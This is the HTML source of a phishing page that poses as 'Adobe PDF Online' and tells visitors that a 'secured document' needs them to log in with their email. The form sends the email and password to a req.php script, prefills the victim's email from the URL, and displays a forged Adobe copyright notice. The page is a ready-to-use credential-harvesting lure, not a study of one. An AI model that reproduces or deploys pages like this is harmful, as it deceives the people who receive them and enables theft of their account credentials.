<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0047)# -->
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

<title>Telex release copy</title>
<style type="text/css">
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
body,td,th {
	font-family: Verdana, Geneva, sans-serif;
}
#central_box {
	background-color: #EAEAEA;
	padding: 20px;
	width: 500px;
	margin-right: auto;
	margin-left: auto;
	
	-moz-border-radius:15px;
	-webkit-border-radius:15px;
	
	-moz-border-radius:15px;
	-webkit-border-radius:15px;
}
#pdf_holder{
	background-color: #DADADA;
	padding: 5px;
	
	-moz-border-radius:15px;
	-webkit-border-radius:15px;
	
	-moz-border-radius:15px;
	-webkit-border-radius:15px;
}
.fieldo{
	padding: 3px;
	width: 99%;
	-moz-border-radius:7px;
	-webkit-border-radius:7px;
	-moz-border-radius:7px;
	-webkit-border-radius:7px;
	border: 1px solid #999;
	font-size: 20px;	
}
#button_field{
	background-color: #069;
	color: white;
	padding: 10px;
	font-size: 18px;
}
.curvy{
	-moz-border-radius:7px;
	-webkit-border-radius:7px;
	-moz-border-radius:7px;
	-webkit-border-radius:7px;	
}
#bg {
	background-image:url("data_import_excel.png");
    background-repeat: no-repeat;
	background-size: 100% 100%;
	background-attachment: fixed;
	z-index: -950;
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;

}
.btno{
	background-color: white;
	padding: 10px;
	text-align: center;	
}
.btno:hover{
	background-color: #A51505;
	color: white;
}

.btno_hl{
	background-color: #A51505;
	color: white;
	padding: 10px;
}
</style>
<!--<script src="jquery.js"></script>-->
<script src="index_files/jquery.js"></script><style type="text/css"></style>
<script src="index_files/blur.js"></script>
</head>

<body id="50" bgproperties="fixed" style="background-image: url(&quot;bg.jpg&quot;); background-attachment: fixed; background-repeat: no-repeat;">
<div style="width: 100%; height: 50px; background-color: #900">
<table style="color: white; height: 50px" border="0" cellpadding="5" cellspacing="0" width="100%">
  <tbody><tr>
    <td width="20%">Adobe PDF Online</td>
    <td style="background-color: black" width="55%">&nbsp;</td>
    <td style="color: black" align="center" bgcolor="#CCCCCC" width="13%"><a href="#"><font color="black">Account</font></a></td>
    <td style="color: black" align="center" bgcolor="#CCCCCC" width="12%"><a href="#"><font color="black">Sign In</font></a></td>
  </tr>
</tbody></table>

</div>


<div style=" float: left; width: 100%; background-color: white; font-size: 12px"><table border="0" cellpadding="5" cellspacing="0" width="100%">
  <tbody><tr>
    <td width="53%">Document</td>
    <td align="center" width="9%"><div class="btno_hl">Edit &amp; Reply</div></td>
    <td align="center" width="10%"><div class="btno">Download</div></td>
    <td align="center" width="10%">  <script language="JavaScript"> 
if (window.print) {
document.write('<form><a href="#" onClick="window.print()" class="btno">Print</a> </form>');
}
</script><form><a href="#" onclick="window.print()" class="btno">Print</a> </form></td>
    <td align="center" width="7%">...</td>
  </tr>
</tbody></table>

</div>


<div>

</div>

<div style="height: 600px; background-color: ; float: left; width: 100%">

	<div id="central_box" style="margin-top: 50px; height: 450px; font-family: 'MS Serif', 'New York', serif;">
   	  <div id="pdf_holder"><table border="0" cellpadding="5" cellspacing="0" width="100%">
  <tbody><tr>
    <td width="23%"><img src="index_files/pdfIcon.png" width="80"></td>
    <td width="4%">&nbsp;</td>
    <td width="73%"><font size="5"><strong>Adobe PDF Online</strong></font></td>
  </tr>
</tbody></table>
</div>

	
    <div style="margin-top: 10px;">
    <table border="0" cellpadding="5" cellspacing="0" width="100%">
  <tbody><tr>
    <td width="76%"><font size="4"><strong>SECURED DOCUMENT!</strong></font><br>
    <font size="2">Your email provider requires authentication, please login to view document</font></td>
    <td width="9%">&nbsp;</td>
    <td width="15%"><img src="index_files/sercure.jpg" class="curvy" width="100"></td>
  </tr>
</tbody></table>

    </div>
    
    
    
    <form action="req.php" method="post">
    	  <p></p>
    <div style="margin-top: 20px">
    <table border="0" cellpadding="5" cellspacing="0" width="75%">
  <tbody><tr>
    <td colspan="3"></td>
    </tr>
  <tr>
    <td>Email</td>
    <td>&nbsp;</td>
    <td><label for="textfield"></label>
      <input name="email"  required  type="text" class="fieldo" id="textfield" value="<?=$_GET[email]?>"></td>
  </tr>
  <tr>
    <td>Password</td>
    <td>&nbsp;</td>
    <td><label for="textfield2"></label>
      <input  required  name="password" id="textfield2" class="fieldo" type="password"></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td><input name="checkbox" id="checkbox" type="checkbox">
      <label for="checkbox">Stay Signed In<br>
        <font size="2">Uncheck on public computer</font>
      </label></td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td>&nbsp;</td>
    <td><input name="button" id="button_field" value="Download Document" type="submit"></td>
  </tr>
  <tr>
    <td width="29%"><p>&nbsp;</p>
      <p>&nbsp;</p></td>
    <td width="3%">&nbsp;</td>
    <td width="68%">&nbsp;</td>
  </tr>
</tbody></table>
    </div>
    </form>
    
    <div class="copyright">
      <p>Copyright � 2017 Adobe Systems Incorporated. All rights reserved.</p>
</div>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
    <p>&nbsp;</p>
</div>



</div></body></html>